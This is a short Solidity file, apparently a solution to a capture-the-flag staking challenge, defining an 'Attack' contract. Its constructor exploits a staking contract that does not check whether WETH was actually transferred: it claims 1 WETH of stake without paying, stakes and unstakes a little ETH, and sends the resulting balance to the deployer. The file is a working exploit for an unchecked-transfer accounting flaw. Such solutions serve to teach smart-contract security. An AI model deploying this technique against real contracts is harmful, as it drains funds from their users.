//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IStake {
    function StakeETH() external payable;
    function StakeWETH(uint256 amount) external returns (bool);
    function Unstake(uint256 amount) external returns (bool);
}

interface IWETH {
    function approve(address, uint256) external;
}

/**
 * @dev call `await contract.StakeETH({value: toWei("0.0011")})` and
 * `await contract.Unstake(toWei("0.0011"))` to satisfy the 3rd and 4th requirements,
 * then deploy the contract to solve the challenge
 */
contract Attack {
    constructor(IWETH weth, IStake stake) payable {
        weth.approve(address(stake), type(uint256).max);
        // stake doesn't check if weth was acctually transferredFrom
        stake.StakeWETH(1 ether);
        stake.StakeETH{value: 1 + 0.001 ether}();
        // leave 1 wei in the contract
        stake.Unstake(0.001 ether);
        (bool s,) = msg.sender.call{value: address(this).balance}("");
        require(s);
    }
}